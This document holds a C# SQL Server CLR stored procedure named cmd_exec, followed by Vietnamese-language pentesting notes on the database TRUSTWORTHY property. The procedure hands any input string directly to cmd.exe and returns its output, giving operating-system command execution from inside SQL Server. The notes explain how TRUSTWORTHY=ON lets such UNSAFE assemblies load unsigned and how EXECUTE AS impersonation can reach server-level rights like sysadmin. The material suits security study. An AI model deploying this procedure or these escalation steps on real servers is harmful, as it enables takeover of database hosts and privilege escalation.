using System;
using System.Data;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;
using System.Diagnostics;

public partial class StoredProcedures
{
    [SqlProcedure]
    public static void cmd_exec(SqlString execCommand)
    {
        if (execCommand.IsNull || string.IsNullOrWhiteSpace(execCommand.Value))
        {
            SqlContext.Pipe.Send("Error: Command is empty or null.");
            return;
        }

        try
        {
            using (Process proc = new Process())
            {
                proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
                proc.StartInfo.Arguments = "/C " + execCommand.Value;
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.RedirectStandardOutput = true;
                proc.StartInfo.RedirectStandardError = true;
                proc.StartInfo.CreateNoWindow = true;

                proc.Start();

                string output = proc.StandardOutput.ReadToEnd();
                string error = proc.StandardError.ReadToEnd();

                proc.WaitForExit();

                // Trả kết quả về dưới dạng 1 cột result set
                SqlMetaData[] metaData = new SqlMetaData[1];
                metaData[0] = new SqlMetaData("output", SqlDbType.NVarChar, 4000);

                SqlDataRecord record = new SqlDataRecord(metaData);

                SqlContext.Pipe.SendResultsStart(record);
                record.SetString(0, output + (string.IsNullOrEmpty(error) ? "" : "\nError: " + error));
                SqlContext.Pipe.SendResultsRow(record);
                SqlContext.Pipe.SendResultsEnd();
            }
        }
        catch (Exception ex)
        {
            SqlContext.Pipe.Send("CLR Error: " + ex.Message);
        }
    }
}

1. TRUSTWORTHY là gì?
TRUSTWORTHY (nghĩa là “đáng tin cậy”) là một thuộc tính ở mức database (không phải mức instance).
Nó cho biết SQL Server có tin tưởng nội dung bên trong database đó hay không.

Giá trị mặc định: OFF (đối với hầu hết các database khi tạo mới).
Chỉ có thể thay đổi bằng lệnh ALTER DATABASE ... SET TRUSTWORTHY ON/OFF.
Cần quyền sysadmin hoặc quyền CONTROL SERVER để bật/tắt thuộc tính này.

Khi thuộc tính này được đặt là ON, SQL Server sẽ “tin tưởng” rằng mã và đối tượng bên trong database là an toàn, từ đó nới lỏng một số kiểm tra bảo mật.
2. Tác dụng của TRUSTWORTHY trong ngữ cảnh CLR Assembly (Command Execution)
Đây chính là lý do quan trọng nhất trong kỹ thuật pentesting mà chúng ta đã thảo luận:

Để tạo và sử dụng CLR Assembly với quyền EXTERNAL_ACCESS hoặc UNSAFE, SQL Server yêu cầu một trong hai điều kiện sau:
Database phải có TRUSTWORTHY = ON, và database owner phải có quyền UNSAFE ASSEMBLY (thường là sysadmin).
Hoặc ký (sign) Assembly bằng certificate/asymmetric key và cấp quyền cho login tương ứng (cách làm an toàn hơn, được khuyến nghị).

Khi TRUSTWORTHY = ON, bạn có thể tạo Assembly với PERMISSION_SET = UNSAFE mà không cần ký code.
→ Điều này cho phép Assembly thực thi mã .NET có quyền cao: chạy lệnh hệ điều hành (cmd.exe, PowerShell), truy cập file system, network, registry, thậm chí inject code vào process của SQL Server.
Nếu TRUSTWORTHY = OFF, lệnh CREATE ASSEMBLY ... WITH PERMISSION_SET = UNSAFE sẽ thất bại (lỗi authorization). Đây là cơ chế bảo vệ mặc định của SQL Server.

Tóm lại trong ngữ cảnh CLR:
TRUSTWORTHY là “chìa khóa” để chuyển Assembly từ chế độ an toàn (SAFE) sang chế độ nguy hiểm (UNSAFE), từ đó cho phép thực thi lệnh hệ thống từ bên trong SQL Server.
3. TRUSTWORTHY còn tác dụng với những gì khác?
Ngoài CLR, thuộc tính này ảnh hưởng đến nhiều tính năng khác liên quan đến impersonation (giả lập quyền người dùng) và truy cập cross-database/cross-instance:

EXECUTE AS (Impersonation):
Khi một stored procedure, function, hoặc trigger sử dụng WITH EXECUTE AS OWNER hoặc EXECUTE AS USER = 'someone', và TRUSTWORTHY = ON, thì quyền của người bị impersonate có thể “thoát ra” ngoài database hiện tại để truy cập:
Các database khác trên cùng instance.
Server-level permissions (ví dụ: quyền sysadmin, quyền tạo login, backup server…).

Truy cập tài nguyên ngoài database (modules, linked servers, extended procedures…).
Một số tính năng legacy hoặc đặc biệt:
Database Mirroring / Availability Groups (cần TRUSTWORTHY ON ở một số trường hợp).
Một số Job Agent hoặc Service Broker.


Lưu ý: TRUSTWORTHY = ON cho phép code trong database “mang theo” quyền impersonated ra ngoài, thay vì bị giới hạn chỉ trong database đó.
